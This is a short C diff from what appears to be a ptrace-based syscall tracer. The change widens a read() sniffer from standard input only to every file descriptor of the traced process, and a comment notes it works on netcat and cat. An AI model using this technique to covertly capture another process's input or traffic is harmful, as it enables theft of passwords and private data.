@@ -248,7 +248,7 @@ int syscall_execve(int pid, struct user_regs_struct regs) {
     
 }
 
-// this simply sniffs standard input.
+// simple modification test for read :) works on netcat, works on cat, more tests needed
 char *syscall_read(int pid, struct user_regs_struct regs) {
 	static in_syscall;
 	static int fd;
@@ -257,10 +257,10 @@ char *syscall_read(int pid, struct user_regs_struct regs) {
 	char *sniffed= (char *)malloc(1000);
 	if(in_syscall == 0) {
 	    fd=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0); // get FD #
-	    if(fd == 0) { // stdin
+	    //if(fd == 0) { // stdin
 		str_addr = ptrace(PTRACE_PEEKUSER, pid, ECX*4,0); // get str_addr	
 		len = regs.edx;
-	    }
+	    //}
 	    in_syscall = 1;
 	}
 	else {
